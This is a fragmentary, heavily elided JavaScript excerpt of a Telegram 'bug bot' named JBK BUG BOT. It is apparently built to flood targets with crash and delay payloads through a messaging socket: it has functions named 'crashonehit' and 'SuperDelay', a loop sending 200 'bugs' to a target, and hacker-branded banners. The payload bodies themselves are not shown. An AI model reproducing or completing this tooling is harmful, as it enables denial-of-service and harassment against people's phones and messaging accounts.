...
const CHANNEL_USERNAME = "@black_killer_hacker"; // Telegram channel
...
bot.onText(/\/start/, async (msg) => {
  ...
  // HTML use karne se underscores (@blackkiller09) error nahi denge
  const introMessage = `
┌───[ ⚡ JBK BUG BOT  ]───┐
│ 𝐃𝐞𝐯: @blackkiller09
│ 𝐔𝐩𝐭: ${uptime}
...
`;
  ...
  await bot.sendPhoto(
    chatId,
    "https://multi-host.ct.ws//sites/IMG-20260224-WA0309.jpg",
    {
...
╚═════════════════╝`);
    ...
    for (let i = 0; i < 200; i++) {
      ...
      console.log(chalk.blueBright(`⚡ [${i + 1}/200] JBK BUG BOTCore sent to ${target}`));
    }
...
║
║ Only the developer
║ *JBK BUG BOT* can use this command.
║
╚═══════════════════╝`);
  }
...
async function SuperDelay(sock, target, mention) {
  console.log(chalk.bold.red(`JBK BUG BOT🐉 Success Sending Bug Delay ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
...
async function crashonehit(sock, target) {
  ...
  try {
    ...
    console.log(chalk.red("⚠ JBK BUG BOT Succesfully sending bug to target"));
  } catch (error) {
...
console.log(chalk.red('JBK BUG BOTBugBot V2 is running! 🚀'));